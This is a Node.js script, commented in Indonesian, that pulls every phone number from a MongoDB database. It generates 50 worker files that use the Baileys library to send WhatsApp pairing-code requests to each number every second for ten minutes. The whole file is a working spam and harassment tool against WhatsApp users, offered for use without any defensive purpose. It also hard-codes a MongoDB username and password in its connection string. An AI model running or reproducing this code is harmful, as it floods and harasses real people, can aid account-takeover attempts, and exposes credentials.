const fs = require("fs");
const path = require("path");
const { spawn } = require("child_process");
const mongoose = require("mongoose");
const { NumberModel } = require("./db"); // Gunakan db.js untuk koneksi dan model

// Jumlah thread untuk file spam-*.js yang dibuat
const NUM_THREADS = 50;

// Folder tempat menyimpan file spam-*.js
const scriptsDir = path.join(__dirname, "scripts");

// Fungsi utama
(async () => {
  try {
    // Koneksi ke MongoDB
    await mongoose.connect("mongodb+srv://voxelspro:vUqjFr9P4XjUhDkv@cluster0.o2wjc.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0", {
      useNewUrlParser: true,
      useUnifiedTopology: true,
    });
    console.log("[DB] Terhubung ke MongoDB");

    // Ambil semua nomor dari database
    const allNumbers = (await NumberModel.find({})).map((doc) => doc.nomor);
    console.log(`[INFO] Ditemukan ${allNumbers.length} nomor dalam database.`);

    // Membuat folder "scripts" jika belum ada
    if (!fs.existsSync(scriptsDir)) {
      fs.mkdirSync(scriptsDir);
    }

    // Membuat file spam-*.js untuk setiap thread
    for (let i = 1; i <= NUM_THREADS; i++) {
      const scriptContent = `
const { makeWASocket, Browsers, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require("pino");

async function spam(nomor) {
  try {
    const { state } = await useMultiFileAuthState("./database/p-${Math.random().toString(36).substring(2)}");

    const client = makeWASocket({
      printQRInTerminal: false,
      browser: Browsers.macOS("Edge"),
      auth: state,
      logger: pino({ level: "fatal" }),
    });

    console.log(\`Memulai proses untuk nomor \${nomor}\`);

    const intervalId = setInterval(async () => {
      try {
        await client.requestPairingCode(nomor);
        console.log(\`[ BERHASIL ] Pairing request sent to \${nomor}\`);
      } catch (err) {
        console.error(\`[ ERROR ] Gagal mengirim pairing request ke \${nomor}\`);
      }
    }, 1000);

    setTimeout(() => {
      clearInterval(intervalId);
      console.log(\`[INFO] Spam selesai untuk nomor \${nomor}\`);
    }, 10 * 60 * 1000); // Hentikan setelah 10 menit
  } catch (err) {
    console.error(\`[ERROR] Terjadi kesalahan pada nomor \${nomor}: \`, err.message);
  }
}

// Jalankan fungsi spam berdasarkan parameter nomor
const targetNumber = process.argv[2];
if (targetNumber) {
  spam(targetNumber);
} else {
  console.error("[ERROR] Nomor target tidak diberikan.");
}
      `;
      const filePath = path.join(scriptsDir, `spam-${i}.js`);
      fs.writeFileSync(filePath, scriptContent.trim());
      console.log(`[INFO] File ${filePath} berhasil dibuat.`);
    }

    // Jalankan setiap file spam-*.js sebagai thread terpisah
    allNumbers.forEach((nomor, index) => {
      const scriptIndex = (index % NUM_THREADS) + 1; // Pilih spam-*.js secara bergilir
      const scriptPath = path.join(scriptsDir, `spam-${scriptIndex}.js`);

      console.log(`[INFO] Menjalankan ${scriptPath} untuk nomor ${nomor}`);
      const thread = spawn("node", [scriptPath, nomor]);

      // Tampilkan output setiap thread
      thread.stdout.on("data", (data) => {
        console.log(`[THREAD-${scriptIndex}]: ${data.toString()}`);
      });

      thread.stderr.on("data", (data) => {
        console.error(`[THREAD-${scriptIndex} ERROR]: ${data.toString()}`);
      });

      thread.on("exit", (code) => {
        console.log(`[THREAD-${scriptIndex}] selesai dengan kode exit ${code}`);
      });
    });

  } catch (err) {
    console.error("[ERROR] Terjadi kesalahan:", err.message);
  } finally {
    // Tutup koneksi database setelah selesai
    mongoose.connection.close();
  }
})();